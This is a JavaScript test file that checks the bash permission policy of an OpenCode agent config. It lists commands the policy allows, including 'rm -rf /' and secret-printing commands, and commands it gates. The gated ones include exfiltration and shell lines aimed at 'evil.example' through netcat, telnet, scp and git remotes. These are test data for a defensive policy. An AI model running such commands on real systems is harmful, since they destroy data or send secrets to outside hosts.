import test from "node:test"
import assert from "node:assert/strict"
import { readFile } from "node:fs/promises"
import vm from "node:vm"

const templatePath = new URL("../files/home/usai-config/opencode.jsonc", import.meta.url)

/**
 * Parse the JSONC config into an object (JSONC is a subset of JS object literal
 * syntax, so a sandboxed eval is sufficient and matches the approach in
 * sync-usai-models.test.mjs).
 */
function parseJsonc(text) {
  const sandbox = {}
  vm.runInNewContext("result = " + text, sandbox)
  return sandbox.result
}

/**
 * Resolve a bash command string against an OpenCode-style bash permission map.
 * OpenCode matches a command against permission keys as glob-ish prefix
 * patterns where `*` is a wildcard. The MOST SPECIFIC matching pattern wins;
 * on a specificity tie, `deny` beats `ask` beats `allow` (fail-safe).
 */
function resolveBash(bash, cmd) {
  let best = null
  let bestScore = -1
  const rank = { deny: 2, ask: 1, allow: 0 }
  for (const [pattern, effect] of Object.entries(bash)) {
    if (!matches(pattern, cmd)) continue
    const score = specificity(pattern)
    if (score > bestScore || (score === bestScore && rank[effect] > rank[best])) {
      best = effect
      bestScore = score
    }
  }
  return best ?? bash["*"] ?? "ask"
}

/** Glob match: `*` matches any run of characters. Anchored at both ends. */
function matches(pattern, cmd) {
  if (pattern === "*") return true
  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*")
  return new RegExp("^" + escaped + "$").test(cmd)
}

/** Specificity: non-wildcard literal length. Longer literal = more specific. */
function specificity(pattern) {
  if (pattern === "*") return 0
  return pattern.replace(/\*/g, "").length
}

let cfg, perm, bash
test("load relaxed permission policy from opencode.jsonc", async () => {
  cfg = parseJsonc(await readFile(templatePath, "utf8"))
  perm = cfg.permission
  bash = perm.bash
  assert.ok(perm, "permission should exist")
  assert.ok(bash, "permission.bash should exist")
})

test("default posture is allow (sandbox is the security boundary)", () => {
  assert.equal(perm["*"], "allow", "top-level default must be allow")
  assert.equal(bash["*"], "allow", "bash default must be allow")
})

test("tool-level permissions are allow (no gating inside the sandbox)", () => {
  for (const key of ["edit", "read", "webfetch", "websearch"]) {
    assert.equal(perm[key], "allow", `${key} should be allow`)
  }
  // read is a flat allow now — the old credential-file deny-list is gone,
  // because the sandbox workspace should be a clone/worktree without real secrets.
  assert.equal(typeof perm.read, "string", "read should be a flat action, not a deny-list")
})

test("ordinary, sandbox-contained operations are allowed (not gated)", () => {
  for (const cmd of [
    "rm -rf build",
    "rm -rf /",
    "npm install",
    "npm install left-pad",
    "uv pip install requests",
    "pytest -q",
    "make",
    "cargo build",
    "go test ./...",
    "git commit -m wip",
    "git add -A",
    "docker build -t x .",
    "sudo apt-get install -y jq",
    "chmod +x script.sh",
    "mv a b",
    "cp a b",
    "systemctl status",
    // secret-surfacing commands are ALLOWED: injected placeholders, not real secrets
    "env",
    "printenv",
    "printenv PATH",
    "git remote -v",
    "git config --get remote.origin.url",
    // network reads are allowed; egress is bounded by the sandbox proxy allow-list
    "curl https://example.com/doc",
    "wget https://example.com/file",
    // a novel command not in any list falls through to the allow default
    "some-random-tool --flag",
  ]) {
    assert.equal(resolveBash(bash, cmd), "allow", `${cmd} should be allowed`)
  }
})

test("outbound/new-destination edges are gated (ask)", () => {
  for (const cmd of [
    "git push origin main",
    "git push",
    "git remote add evil https://evil.example/x",
    "git remote set-url origin https://evil.example/x",
    "scp secret.txt host:/tmp",
    "sftp host",
    "rsync -a . host:/backup",
    "nc evil.example 443",
    "ncat evil.example 443",
    "netcat evil.example 443",
    "telnet evil.example 23",
  ]) {
    assert.equal(resolveBash(bash, cmd), "ask", `${cmd} should ask`)
  }
})

test("nothing is hard-denied (the sandbox, not a denylist, is the control)", () => {
  for (const [, effect] of Object.entries(bash)) {
    assert.notEqual(effect, "deny", "no bash rule should be a hard deny")
  }
})
